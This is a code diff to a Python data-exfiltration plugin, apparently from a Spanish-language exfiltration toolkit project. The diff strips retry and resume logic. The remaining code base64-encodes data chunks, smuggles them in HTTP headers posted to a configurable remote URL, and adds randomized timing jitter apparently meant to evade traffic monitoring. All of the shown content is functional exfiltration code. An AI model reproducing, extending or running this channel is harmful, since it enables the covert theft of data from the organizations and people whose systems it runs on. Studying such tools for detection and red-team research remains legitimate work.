@@ -10,29 +10,9 @@ class HttpClientHeaders(ExfilClientPlugin):
     metodo = 1
     name = "http_client_headers"
 
-    def _send_with_retries(self, req: urllib.request.Request, timeout: int, retries: int, backoff_ms: int) -> bytes:
-        last_exc: Exception | None = None
-        for attempt in range(retries + 1):
-            try:
-                with urllib.request.urlopen(req, timeout=timeout) as resp:
-                    return resp.read()
-            except Exception as e:
-                last_exc = e
-                if attempt >= retries:
-                    break
-                time.sleep(((2 ** attempt) * backoff_ms) / 1000.0)
-        raise last_exc  # type: ignore
-
-    def _status_probe(self, url: str, exfil_id: str, timeout: int, auth_token: str | None) -> int:
-        headers = {"X-Exfil-Id": exfil_id, "X-Exfil-Status": "1"}
-        if auth_token:
-            headers["X-Auth-Token"] = auth_token
-        req = urllib.request.Request(url=url, data=None, headers=headers, method="HEAD")
-        try:
-            with urllib.request.urlopen(req, timeout=timeout) as resp:
-                return int(resp.headers.get("X-Exfil-Next-Seq") or "0")
-        except Exception:
-            return 0
+    def _send(self, req: urllib.request.Request, timeout: int) -> bytes:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            return resp.read()
 
     def run(self, config: Dict[str, Any], payload_iter: Iterable[bytes]) -> Dict[str, Any]:
         url = config.get("url")
@@ -42,27 +22,16 @@ class HttpClientHeaders(ExfilClientPlugin):
         timeout = int(config.get("timeout_s") or 10)
         user_agent = config.get("user_agent") or "TFG-Exfil/1.1"
         auth_token = config.get("auth_token")
-        retries = int(config.get("retries") or 3)
-        backoff_ms = int(config.get("retry_backoff_ms") or 250)
         ritmo_base = int(config.get("ritmo_base_ms") or 0)
         ritmo_disp = int(config.get("ritmo_dispersion_ms") or 0)
-        resume_probe = bool(config.get("resume_probe") or False)
-
-        next_seq = 0
-        if resume_probe:
-            next_seq = self._status_probe(url, exfil_id, timeout, auth_token)
 
         sent_bytes = 0
         sent_frags = 0
         seq = 0
         for chunk in payload_iter:
-            if seq < next_seq:
-                seq += 1
-                continue
             if ritmo_base or ritmo_disp:
                 jitter = random.uniform(-ritmo_disp, ritmo_disp)
                 time.sleep(max(0.0, (ritmo_base + jitter)/1000.0))
-
             b64 = base64.b64encode(chunk).decode("ascii")
             headers = {
                 "User-Agent": user_agent,
@@ -74,8 +43,7 @@ class HttpClientHeaders(ExfilClientPlugin):
             if auth_token:
                 headers["X-Auth-Token"] = auth_token
             req = urllib.request.Request(url=url, data=b"", headers=headers, method="POST")
-            _ = self._send_with_retries(req, timeout, retries, backoff_ms)
-
+            self._send(req, timeout)
             sent_bytes += len(chunk)
             sent_frags += 1
             seq += 1
@@ -84,6 +52,5 @@ class HttpClientHeaders(ExfilClientPlugin):
         if auth_token:
             headers["X-Auth-Token"] = auth_token
         req = urllib.request.Request(url=url, data=b"", headers=headers, method="POST")
-        _ = self._send_with_retries(req, timeout, retries, backoff_ms)
-
+        self._send(req, timeout)
         return {"ok": True, "plugin": self.name, "exfil_id": exfil_id, "sent_bytes": sent_bytes, "sent_fragments": sent_frags}
